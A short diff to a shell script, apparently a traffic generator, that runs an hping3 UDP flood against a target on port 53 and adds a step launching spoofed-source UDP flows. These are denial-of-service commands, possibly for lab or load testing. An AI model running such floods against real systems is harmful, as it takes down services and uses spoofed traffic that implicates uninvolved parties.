@@ -45,4 +45,8 @@ fi
 
 launch "hping3 udp flood" hping3 ${spoof} -2 --flood -p 53 "${TARGET}"
 
+if [ -n "${SPOOF_SOURCE}" ]; then
+  launch_spoofed_flows "${SPOOF_SOURCE}" "${TARGET}" 53 udp "${ZONE}"
+fi
+
 finish
